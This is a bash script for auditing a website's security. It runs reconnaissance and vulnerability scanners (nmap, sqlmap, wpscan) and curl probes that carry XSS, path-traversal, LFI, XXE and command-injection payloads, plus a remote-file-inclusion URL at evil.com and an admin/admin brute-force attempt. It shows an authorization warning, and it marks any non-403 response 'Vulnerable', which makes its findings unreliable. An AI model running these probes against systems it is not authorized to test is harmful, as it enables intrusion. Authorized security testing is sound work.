#!/bin/bash
# isMyWebsiteInsecure-1.sh
# developed by Oscar Azevedo, oscar.azevedo@aeportugal.pt, oscar.msazevedo@gmail.com
# v1.0
# check the security of a given website with public command line tools

# Function to validate URL format
validate_url() {
    if [[ ! $1 =~ ^(http|https):// ]]; then
        echo "Error: The provided parameter is not a valid URL. It should start with http:// or https://."
        exit 1
    fi
}

# Function to check if required tools are installed
check_tools() {
    required_tools=(whois dnsrecon whatweb nc wpscan sqlmap curl nmap sslscan nrich dig)
    for tool in "${required_tools[@]}"; do
        if ! command -v $tool &> /dev/null; then
            echo "$tool is not installed. Please install it before running the script."
            exit 1
        fi
    done
}

# Main script
main() {
    # Display ethical use warning
    echo -e "\n\e[31mWarning: Ensure you have explicit authorization before running these tests. Unauthorized testing is illegal and unethical.\e[0m\n"

    # Ask user if they want to continue
    read -p "Do you want to continue running the script? (yes/no): " choice
    if [[ "$choice" != "yes" ]]; then
        echo "Exiting script."
        exit 0
    fi

    # Check if a URL parameter is provided
    if [ "$#" -ne 1 ]; then
        echo -e "\e[32mUsage: $0 <url>\e[0m"
        exit 1
    fi

    # Validate the URL format
    url="$1"
    validate_url "$url"

    # Check if required tools are installed
    check_tools

    # Extract host and domain
    host=$(echo "$url" | awk -F[/:] '{print $4}')
    domain=$(echo "$host" | awk -F. '{if (NF>2) {print $(NF-1)"."$NF} else {print $0}}')
    # Get the first IPv4 address from DNS
    ipv4=$(dig +short "$host" | tail -n1)

    echo
    echo "Host=$host"
    echo "Domain=$domain"
    echo "IPv4=$ipv4"
    echo "Url=$url"
    echo

    # WHOIS lookup for domain information
    echo -e "\e[38;5;208m[+] Running WHOIS lookup...\e[0m"
    echo -e "\e[32mwhois \"$domain\"\e[0m"
    whois "$domain"
    echo -e "\n\n"

    # DNS reconnaissance
    echo -e "\e[38;5;208m[+] Running DNS reconnaissance...\e[0m"
    echo -e "\e[32mdnsrecon -d \"$domain\"\e[0m"
    dnsrecon -d "$domain"
    echo -e "\n\n"

    # Identify technologies used on the website
    echo -e "\e[38;5;208m[+] Identifying technologies used on the website...\e[0m"
    echo -e "\e[32mwhatweb \"$url\"\e[0m"
    whatweb "$url"
    echo -e "\n\n"

    # Apache enumeration
    echo -e "\e[38;5;208m[+] Running Apache enumeration...\e[0m"
    echo -e "\e[32mnmap --script http-apache-server-status \"$host\"\e[0m"
    nmap --script http-apache-server-status "$host"
    echo -e "\n\n"

    # Nginx enumeration
    echo -e "\e[38;5;208m[+] Running Nginx enumeration...\e[0m"
    echo -e "\e[32mnmap --script http-nginx-server-status \"$host\"\e[0m"
    nmap --script http-nginx-server-status "$host"
    echo -e "\n\n"

    # IIS enumeration
    echo -e "\e[38;5;208m[+] Running IIS enumeration...\e[0m"
    echo -e "\e[32mnmap --script http-iis-webdav-vuln \"$host\"\e[0m"
    nmap --script http-iis-webdav-vuln "$host"
    echo -e "\n\n"

    # Check MSSQL, MySQL or MariaDB database version
    echo -e "\e[38;5;208m[+] Checking MSSQL, MySQL or MariaDB database version...\e[0m"
    echo -e "\e[32mnmap -p 1433,3306 --script ms-sql-info,mysql-info \"$host\"\e[0m"
    nmap -p 1433,3306 --script ms-sql-info,mysql-info "$host"
    echo -e "\n\n"

    # Wordpress vulnerability scan
    echo -e "\e[38;5;208m[+] Running Wordpress vulnerability scan...\e[0m"
    echo -e "\e[32mwpscan --no-banner --stealthy --url \"$url\"\e[0m"
    wpscan --no-banner --stealthy --url "$url"
    echo -e "\n\n"

    # Moodle vulnerability scan
    echo -e "\e[38;5;208m[+] Running Moodle vulnerability scan...\e[0m"
    echo -e "\e[32mnmap --script http-moodle-brute --script-args moodle-username=admin,moodle-password=admin \"$host\"\e[0m"
    nmap --script http-moodle-brute --script-args moodle-username=admin,moodle-password=admin "$host"
    echo -e "\n\n"

    # PHP detection
    echo -e "\e[38;5;208m[+] Detecting PHP...\e[0m"
    echo -e "\e[32mnmap --script http-php-version \"$host\"\e[0m"
    nmap --script http-php-version "$host"
    echo -e "\n\n"

    # phpMyAdmin detection
    echo -e "\e[38;5;208m[+] Detecting phpMyAdmin...\e[0m"
    echo -e "\e[32mnmap --script http-phpmyadmin-dir-traversal \"$host\"\e[0m"
    nmap --script http-phpmyadmin-dir-traversal "$host"
    echo -e "\n\n"

    # SQL Injection test
    echo -e "\e[38;5;208m[+] Running SQL Injection test...\e[0m"
    echo -e "\e[32msqlmap -u \"$url\" --batch --dbs\e[0m"
    sqlmap -u "$url" --batch --dbs
    echo -e "\n\n"


    # XSS test
    echo -e "\e[38;5;208m[+] Running XSS test...\e[0m"
    xss_command="curl -s -o /dev/null -w \"%{http_code}\" -d \"<script>alert(1)</script>\" \"$url\""
    echo -e "\e[32m${xss_command}\e[0m"
    xss_status=$(eval $xss_command)
    echo -e "XSS test: HTTP code: $xss_status"
    if [ "$xss_status" -ne 403 ]; then
       echo -e "\e[31mVulnerable\e[0m"
    fi
    echo -e "\n\n"

    # CSRF test
    echo -e "\e[38;5;208m[+] Running CSRF test...\e[0m"
    csrf_command="curl -s -o /dev/null -w \"%{http_code}\" -X POST -d \"param=value\" \"$url\""
    echo -e "\e[32m${csrf_command}\e[0m"
    csrf_status=$(eval $csrf_command)
    echo -e "CSRF test: HTTP code: $csrf_status"
    if [ "$csrf_status" -ne 403 ]; then
       echo -e "\e[31mVulnerable\e[0m"
    fi
    echo -e "\n\n"

    # Directory traversal test
    echo -e "\e[38;5;208m[+] Running Directory traversal test...\e[0m"
    dir_traversal_command="curl -s -o /dev/null -w \"%{http_code}\" \"$url/../../etc/passwd\""
    echo -e "\e[32m${dir_traversal_command}\e[0m"
    dir_traversal_status=$(eval $dir_traversal_command)
    echo -e "Directory traversal test: HTTP code: $dir_traversal_status"
    if [ "$dir_traversal_status" -ne 403 ]; then
       echo -e "\e[31mVulnerable\e[0m"
    fi
    echo -e "\n\n"

    # Command injection test
    echo -e "\e[38;5;208m[+] Running Command injection test...\e[0m"
    cmd_injection_command="curl -s -o /dev/null -w \"%{http_code}\" \"$url?cmd=ls\""
    echo -e "\e[32m${cmd_injection_command}\e[0m"
    cmd_injection_status=$(eval $cmd_injection_command)
    echo -e "Command injection test: HTTP code: $cmd_injection_status"
    if [ "$cmd_injection_status" -ne 403 ]; then
       echo -e "\e[31mVulnerable\e[0m"
    fi
    echo -e "\n\n"

    # Host header injection test
    echo -e "\e[38;5;208m[+] Running Host header injection test...\e[0m"
    host_header_injection_command="curl -s -o /dev/null -w \"%{http_code}\" -H \"Host: malicious.example.com\" \"$url\""
    echo -e "\e[32m${host_header_injection_command}\e[0m"
    host_header_injection_status=$(eval $host_header_injection_command)
    echo -e "Host header injection test: HTTP code: $host_header_injection_status"
    if [ "$host_header_injection_status" -ne 403 ]; then
       echo -e "\e[31mVulnerable\e[0m"
    fi
    echo -e "\n\n"

    # Path traversal test
    echo -e "\e[38;5;208m[+] Running Path traversal test...\e[0m"
    path_traversal_command="curl -s -o /dev/null -w \"%{http_code}\" \"$url/../../../../etc/passwd\""
    echo -e "\e[32m${path_traversal_command}\e[0m"
    path_traversal_status=$(eval $path_traversal_command)
    echo -e "Path traversal test: HTTP code: $path_traversal_status"
    if [ "$path_traversal_status" -ne 403 ]; then
       echo -e "\e[31mVulnerable\e[0m"
    fi
    echo -e "\n\n"

    # Local File Inclusion (LFI) test
    echo -e "\e[38;5;208m[+] Running Local File Inclusion (LFI) test...\e[0m"
    lfi_command="curl -s -o /dev/null -w \"%{http_code}\" \"$url?file=../../../../etc/passwd\""
    echo -e "\e[32m${lfi_command}\e[0m"
    lfi_status=$(eval $lfi_command)
    echo -e "Local File Inclusion (LFI) test: HTTP code: $lfi_status"
    if [ "$lfi_status" -ne 403 ]; then
        echo -e "\e[31mVulnerable\e[0m"
    fi
    echo -e "\n\n"

    # Remote File Inclusion (RFI) test
    echo -e "\e[38;5;208m[+] Running Remote File Inclusion (RFI) test...\e[0m"
    rfi_command="curl -s -o /dev/null -w \"%{http_code}\" \"$url?file=http://evil.com/shell.txt\""
    echo -e "\e[32m${rfi_command}\e[0m"
    rfi_status=$(eval $rfi_command)
    echo -e "Remote File Inclusion (RFI) test: HTTP code: $rfi_status"
    if [ "$rfi_status" -ne 403 ]; then
        echo -e "\e[31mVulnerable\e[0m"
    fi
    echo -e "\n\n"

    # XML External Entity (XXE) test
    echo -e "\e[38;5;208m[+] Running XML External Entity (XXE) test...\e[0m"
    xxe_command="curl -s -o /dev/null -w \"%{http_code}\" -d '<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [  <!ELEMENT foo ANY >  <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>' \"$url\""
    echo -e "\e[32m${xxe_command}\e[0m"
    xxe_status=$(eval $xxe_command)
    echo -e "XML External Entity (XXE) test: HTTP code: $xxe_status"
    if [ "$xxe_status" -ne 403 ]; then
        echo -e "\e[31mVulnerable\e[0m"
    fi
    echo -e "\n\n"


    # SSL/TLS scan
    echo -e "\e[38;5;208m[+] Running SSL/TLS scan...\e[0m"
    echo -e "\e[32msslscan \"$host\"\e[0m"
    sslscan "$host"
    echo -e "\n\n"

    # Basic Nmap scan
    echo -e "\e[38;5;208m[+] Running basic Nmap scan...\e[0m"
    echo -e "\e[32msudo nmap \"$host\"\e[0m"
    sudo nmap "$host"
    echo -e "\n\n"

    # Comprehensive Nmap scan with vulnerability scripts
    echo -e "\e[38;5;208m[+] Running comprehensive Nmap scan with vulnerability scripts...\e[0m"
    echo -e "\e[32msudo nmap -sV -sC --script=vuln* -A $host \e[0m"
    sudo nmap -sV -sC --script=vuln* -A $host
    echo -e "\n\n"

    # Shodan scan
    echo -e "\e[38;5;208m[+] Running Shodan scan...\e[0m"
    echo -e "\e[32mecho $ipv4 | nrich - \e[0m"
    echo $ipv4 | nrich -
    echo -e "\n\n"

}

# Execute main function
main "$@"
